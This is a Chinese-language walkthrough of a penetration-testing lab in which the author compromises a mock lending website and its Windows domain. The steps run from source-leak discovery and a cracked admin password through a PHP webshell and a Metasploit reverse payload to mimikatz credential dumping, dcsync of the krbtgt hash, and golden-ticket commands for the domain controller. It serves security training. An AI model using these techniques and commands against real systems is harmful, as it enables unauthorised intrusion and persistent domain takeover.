暗月渗透实战靶场-项目六

  • 靶场

环境介绍

Web相当于一个对外的服务器，对外的IP模拟为10.10.1.1/24网段，这里主要以模拟该外网IP为主。其内部还有一个网段是10.10.10.1/24是不对外开放的。且Web服务器是进行IP与域名绑定的，其域名为www.webhack123.com，若不进行本地host绑定是无法直接访问的。

信息收集

  1. nmap 端口探测

  2. nmap 获取系统和端口版本信息

从端口探测的信息得到服务器是 WEB 容器是 phpstudy 搭建的

操作系统是 Microsoft Windows Server 2008 R2

对网站进行安全检测

绑定 hosts

在环境介绍中有介绍到要将10.10.1.150与www.webhack123.com进行hosts绑定

Windows中hosts文件一般在C:\Windows\System32\drivers\etc目录下

Linux系统下hosts文件的位置是 /etc/hosts

发现该网站是一个借款平台

dirsearch目录文件扫描

发现存在svn、ds_store源码泄露

ds_store利用

利用工具dumpall 进行利用

这里是通过ds_store利用下载的相关信息，通过浏览发现作用不大

wc.db 文件利用

在上述目录文件扫描可以观察到一个db数据库的文件，这里就进行下载查看

对于db后缀的文件可以通过SQLite工具进行查看

查看数据库 基本知道网站的整个架构

通过该wc.db可以看到相应的日志文件的存放

thinkphp 日志文件泄露

通过上面的wc.db文件可以进行访问

http://www.webhack123.com/App/Runtime/Logs/18_06_22.log

这里可以看到记录了相应的username和passoword的值，相当于间接的告诉了我们密码。当然拉，这日志不是最新的，因为密码可能也会更改，所以得获取最近的一次日志进行查找特定密码。

python 编写日志文件

发现管理员密文

通过访问最近一次的日志文件进行获取

http://www.webhack123.com/App/Runtime/Logs/20_06_22.log

密文为：74c774ef39b5b977c1fd59dbfc73c3e380a65aa3

猜测md5加密，进行md5解密

解密获取到管理员密码为：web123

绑定 hosts 碰撞管理后台子域名

http://admin.webhack123.com/

这里访问前依然要修改hosts文件否则无法访问

上传文件拿shell

利用上面获取到的管理员密码登录进去（admin-----web123）

通过添加允许上传类型为php

上传一句话木马文件

http://admin.webhack123.com/Public/Upload/20220505/7feff49b94f50c610b08da5c0381d968.php

利用中国蚁剑连接

由于是phpstudy集成搭建的环境，所以一般情况下拿下的都是高权限，这里就不用提权了。

metasploit 进行信息收集

生成攻击载荷

将生成的s.exe上传到服务器中

监听上线

运行s.exe文件

这里成功看见已经反弹到MSF中了

迁移进程

由于反弹的exe可能不稳定导致掉线以及可能是x86的会话导致后续操作容易失败，所以稳妥的方法就是迁移到另一个x64进程中

先用ps查看进程再用migrate 进程号 进行迁移进程

mimikatz 哈希明文获取

通过简单的信息搜集可以看到，该主机的用户有：Administorator密码为!@#Qwe456，且也存在一个域内主机WEB，该域为HACKBOX

跨网段域渗透

确定域环境

ipconifg /all 判断存在域dns

net view /domain 判断存在域

net time /domain 判断主域

通过上述收集可以获取域为hackbox.com，而主域为dc.hackbox.com

定位域控

ping dc.hackbox.com

可以定位到域控IP地址为10.10.10.149

域内信息收集

net view /domain:HACKBOX

Ipconfig

得到两个 ip 段

10.10.10.150

10.10.1.150

由于该域内域控为dc.hackbox.com,且IP为10.10.10.149，所以web主机就是10.10.10.150的IP段使用的

获取登录过的用户信息

添加路由渗透 DC 域控

arp

run autoroute -s 10.10.10.0/24

开启代理

设置 porychanins 代理 nmap 扫描

需要先安装proxychains

安装命令：sudo apt-get install proxychains

vi /etc/proxychains.conf

发现打开了445所以可以尝试永恒之蓝

永恒之蓝ms17_010

经过尝试溢出失败

ms14-068提权域控

使用这个 ms14-068 需要一个普通域控用户

获取普通域用户

但是不知道密码，但是知道Administrator的密码为!@#Qwe456，所以可以尝试web域用户名密码是不是相同，就需要验证了。

通过远程验证，如果没开启远程可以在metasploit中输入

run post/windows/manage/enable_rdp，开启远程

可以观察到web域用户密码就是!@#Qwe456，只是不是远程组

制作黄金票据

黄金票据可以使我们永久的获取目标机器的控制权限、就算是主机密码修改、影子用户被删除、都可以保障我们能再次获得权限。

制作金票的条件：

1、域名称

2、域的SID值

3、域的KRBTGT账户密码HASH

4、伪造用户名，可以是任意的

获取 ntml sid rid

wmic useraccount where name="krbtgt" get sid

窃取域控超级管理权限

系统权限没办法做 dcsync 所以切换域管理权限

ps

steal_token 进程号

dcsync_ntlm krbtgt

[+] Account : krbtgt

[+] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98

[+] LM Hash : 36588bd35fd1fe85ec5fd73a1ca6805b

[+] SID : S-1-5-21-2005268815-658469957-1189185684-502

[+] RID : 502

生成黄金票据

golden_ticket_create -d <域名> -u <任意用户名> -s <Domain SID> -k <krbtgt NTLM Hash> -t <ticket 本地存储路径如:/tmp/krbtgt.ticket>

golden_ticket_create -d hackbox.com -u mrfantest -s S-1-5-21-2005268815-658469957-1189185684 -k
6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbtgt.ticket

注入黄金票据

切换到 web 服务器 把凭据都清理掉

kerberos_ticket_purge 清理票据

导入黄金票据

kerberos_ticket_use /tmp/krbtgt.ticket

dir \\dc\c$

这里可以观察到一个任意用户构造的票据信息

其它信息查看

通过查看该主机只有一个IP段，没有其它网段内，且也可以拿到域控，此时整个渗透完成。
